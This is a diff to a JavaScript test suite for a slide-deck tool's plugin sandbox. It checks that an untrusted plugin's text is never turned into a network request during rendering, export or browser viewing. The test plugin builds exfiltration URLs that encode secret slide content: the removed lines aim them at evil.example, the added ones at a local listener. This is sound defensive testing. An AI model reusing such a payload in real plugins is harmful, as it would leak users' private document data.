@@ -242,17 +242,28 @@ describe('the fence door through the real sandbox', () => {
     assert.match(r.rendered.html, /did not draw this block: the renderer returned nothing the sanitizer kept/);
   });
 
-  test('A SLIDE A SHIPPED PASS REBUILDS FROM ITS TEXT: the fence stays code, nothing reads the plugin’s text as an address', { timeout: TIMEOUT }, async () => {
+  test('A SLIDE A SHIPPED PASS REBUILDS FROM ITS TEXT: the plugin DRAWS there, and nothing reads its text as an address', { timeout: TIMEOUT }, async () => {
     hits = [];
-    // `closing qr` is still rebuilt by a shipped pass (`qr-general` turns a bullet into a code); `video` is not any more.
-    const md = '---\ntheme: indaco\n---\n\n<!-- _class: closing qr -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n';
-    const p = plugin(`function render(f){return "<ul><li>https://evil.example/leak?d="+encodeURIComponent(f.body)+" <code>poster</code></li></ul>"}\nexport { render as default };`);
+    // Flipped from "the fence stays code" (2026-11-09): the door used to keep a plugin off a slide a shipped pass rebuilds
+    // (`qr` turns a bullet into a code). Every reader now masks `[data-lattice-plugin]` (spec/LPM.md §10), so the plugin
+    // draws, and its `qr`- and `url`-keyed bullets aimed at the listener are text. Slide 2 has no link of the author's:
+    // a pass that read plugin text would encode the plugin's.
+    const md = '---\ntheme: indaco\n---\n\n<!-- _class: closing qr -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n\n---\n\n<!-- _class: closing qr -->\n\n## No link of the author\'s\n\n```gantt\nSECRET-Q4\n```\n';
+    const p = plugin(`function render(f){var u="${H}/leak?d="+encodeURIComponent(f.body);return "<ul><li>"+u+"</li><li>"+u+" <code>qr</code></li><li>"+u+" <code>url</code></li></ul>"}\nexport { render as default };`);
     approve(p);
     const r = run(p, md);
-    assert.doesNotMatch(r.rendered.html, /data-lattice-plugin/, 'the plugin never drew there');
-    assert.match(r.rendered.html, /language-gantt/, 'the author’s block is still code');
-    assert.doesNotMatch(r.rendered.html, /evil\.example/, 'no pass could read the plugin’s text as an address, because it never ran');
-    assert.ok(r.lines.warn.some((l) => /slide 1 is rebuilt by the shipped `qr-general` pass/.test(l)), r.lines.warn.join('\n'));
+    const html = r.rendered.html;
+    const roots = [...html.matchAll(/<div data-lattice-plugin="gantt-plugin">[\s\S]*?<\/div>/g)].map((m) => m[0]);
+    assert.equal(roots.length, 2, 'the plugin drew on both slides');
+    assert.doesNotMatch(html, /language-gantt/, 'in place of the blocks');
+    for (const root of roots) assert.equal((root.match(/<li>http:\/\/127\.0\.0\.1:\d+\/leak\?d=SECRET-Q\d/g) || []).length, 3, 'its three bullets are on the slide, as text');
+    let outside = html;
+    for (const root of roots) outside = outside.replace(root, '');
+    assert.doesNotMatch(outside, /127\.0\.0\.1/, 'and nowhere outside its roots');
+    assert.equal((html.match(/class="qr-figure"/g) || []).length, 1, 'one code: the author\'s, on slide 1; slide 2 has none');
+    const { encode } = require('../../../lib/components/connect/_qr-card/qr-card.js');
+    assert.ok(html.includes(encode('https://www.youtube.com/watch?v=dQw4w9WgXcQ', 'QR code')), 'and it encodes the author\'s link');
+    assert.ok(!r.lines.warn.some((l) => /rebuilt by the shipped|raw <section>/.test(l)), r.lines.warn.join('\n'));
     await settle();
     assert.deepEqual(hits, []);
   });
@@ -322,5 +333,68 @@ describe('the same fixture as the Studio’s door (HARD RULE #1)', () => {
     assert.equal(r.refusal, undefined, JSON.stringify(r.refusal));
     const failed = CHECKS.filter(([, ok]) => !ok(r.rendered.html)).map(([label]) => label);
     assert.deepEqual(failed, []);
+  });
+});
+
+describe('the attack through the REAL CLI export, with a network log (spec/LPM.md §10)', () => {
+  // The same plugin and deck as "A SLIDE A SHIPPED PASS REBUILDS FROM ITS TEXT", installed and approved the way an author
+  // does it, exported by `lattice` itself. The plugin's bullets aim at this process's listener, so ANY request a pass built
+  // from them, in the export or in a browser opening it, is in `hits`. The PDF is rendered with `--allow-remote`, which turns
+  // the CLI's offline browser OFF (lib/core/offline-chromium.js): zero hits there says no pass made an address, not that a
+  // lock stopped one. The HTML keeps its lock, and is opened in a real Chromium as a reader would.
+  const { spawn } = require('node:child_process');
+  const ROOT = path.resolve(__dirname, '..', '..', '..');
+  const work = fs.mkdtempSync(path.join(os.tmpdir(), 'lattice-fence-attack-'));
+  after(() => fs.rmSync(work, { recursive: true, force: true }));
+  // Async on purpose: a render that fetched from the listener in THIS process must not be starved by a blocking spawn.
+  const lattice = (...args) => new Promise((resolve) => {
+    const child = spawn(process.execPath, [path.join(ROOT, 'lattice.js'), ...args], { cwd: work, env: { ...process.env, LATTICE_HOME: home } });
+    let out = '';
+    child.stdout.on('data', (d) => (out += d));
+    child.stderr.on('data', (d) => (out += d));
+    child.on('close', (code) => resolve({ code, out }));
+  });
+
+  test('HTML and PDF (network allowed) exports: the plugin drew on the qr slide, the code is the author\'s, and 0 requests reached the attacker', { timeout: TIMEOUT }, async () => {
+    const dir = path.join(work, 'gantt-plugin');
+    fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(path.join(dir, 'gantt-plugin.manifest.json'), JSON.stringify({ name: 'gantt-plugin', type: 'plugin', format: 1, api: 1, contributes: { fences: { gantt: { body: 'text' } } } }));
+    fs.writeFileSync(path.join(dir, 'gantt-plugin.docs.md'), '# gantt-plugin\n');
+    fs.writeFileSync(path.join(dir, 'gantt-plugin.fixtures.md'), '```gantt\nA 1\n```\n');
+    fs.writeFileSync(path.join(dir, 'gantt-plugin.render.js'), `function render(f){var u="${H}/leak?d="+encodeURIComponent(f.body);return "<ul><li>"+u+"</li><li>"+u+" <code>qr</code></li><li>"+u+" <code>url</code></li></ul>"}\nexport { render as default };\n`);
+    fs.writeFileSync(path.join(work, 'deck.md'), '---\ntheme: indaco\nplugins: [gantt-plugin]\n---\n\n<!-- _class: closing qr -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3\n```\n\n---\n\n<!-- _class: closing qr -->\n\n## No link of the author\'s\n\n```gantt\nSECRET-Q4\n```\n');
+    for (const args of [['packages', 'add', dir], ['packages', 'trust', 'plugin/gantt-plugin', '--yes']]) {
+      const r = await lattice(...args);
+      assert.equal(r.code, 0, r.out);
+    }
+    hits = [];
+    const html = await lattice('deck.md', '-o', 'out.html');
+    assert.equal(html.code, 0, html.out);
+    const pdf = await lattice('deck.md', '-o', 'out.pdf', '--allow-remote');
+    assert.equal(pdf.code, 0, pdf.out);
+    assert.ok(fs.statSync(path.join(work, 'out.pdf')).size > 0);
+    const doc = fs.readFileSync(path.join(work, 'out.html'), 'utf8');
+    assert.equal((doc.match(/<div data-lattice-plugin="gantt-plugin">/g) || []).length, 2, 'the plugin drew on both rebuilt slides');
+    assert.equal((doc.match(/<figure class="qr-figure">/g) || []).length, 1, 'one code, the author\'s');
+    assert.deepEqual(hits, [], `the exports reached the attacker: ${hits.join(' ')}`);
+    // A reader opens the HTML. Wait on network quiet (a signal), then on the slides being there.
+    const puppeteer = require('puppeteer');
+    const browser = await puppeteer.launch({ headless: 'new', executablePath: process.env.CHROME_PATH || undefined, args: ['--no-sandbox', '--disable-dev-shm-usage'] });
+    try {
+      const page = await browser.newPage();
+      const requests = [];
+      page.on('request', (q) => requests.push(q.url()));
+      await page.goto(`file://${path.join(work, 'out.html')}`, { waitUntil: 'networkidle0' });
+      const seen = await page.evaluate(() => ({
+        roots: document.querySelectorAll('section [data-lattice-plugin]').length,
+        figures: document.querySelectorAll('section .qr-figure').length,
+        attrs: [...document.querySelectorAll('section *')].filter((e) => !e.closest('[data-lattice-plugin]')).flatMap((e) => [...e.attributes].map((a) => a.value)).filter((v) => v.includes('127.0.0.1')),
+      }));
+      assert.deepEqual(seen, { roots: 2, figures: 1, attrs: [] });
+      assert.deepEqual(requests.filter((u) => u.includes('127.0.0.1')), []);
+    } finally {
+      await browser.close();
+    }
+    assert.deepEqual(hits, []);
   });
 });
